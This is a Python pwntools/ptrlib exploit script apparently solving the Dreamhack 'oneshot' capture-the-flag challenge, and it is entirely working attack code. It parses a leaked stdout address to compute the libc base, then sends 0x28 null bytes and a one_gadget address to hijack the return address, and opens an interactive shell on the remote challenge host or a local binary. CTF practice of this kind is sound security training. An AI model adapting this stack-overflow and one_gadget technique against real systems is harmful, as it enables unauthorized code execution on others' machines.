#!/usr/bin/env python
import sys
import ptrlib as ptr
import pwn

exe = ptr.ELF("./oneshot_patched")
libc = ptr.ELF("./libc.so.6")
# ld = ptr.ELF("")


def connect():
    if len(sys.argv) > 1 and sys.argv[1] == "remote":
        return pwn.remote("host3.dreamhack.games", 13237)
    else:
        return pwn.process(exe.filepath)


def unwrap(x):
    if x is None:
        ptr.logger.error("Failed to unwrap")
        exit(1)
    else:
        return x


def main():
    io = connect()

    one_gadgets = [0x45216, 0x4526A, 0xF02A4, 0xF1147]

    io.recvuntil("stdout: ")
    libc.base = int(io.recvline().strip(b"\n"), 16) - 3954208

    payload = b"\0" * 0x28
    payload += ptr.p64(libc.base + one_gadgets[0])

    io.sendline(payload)
    io.interactive()
    return


if __name__ == "__main__":
    main()
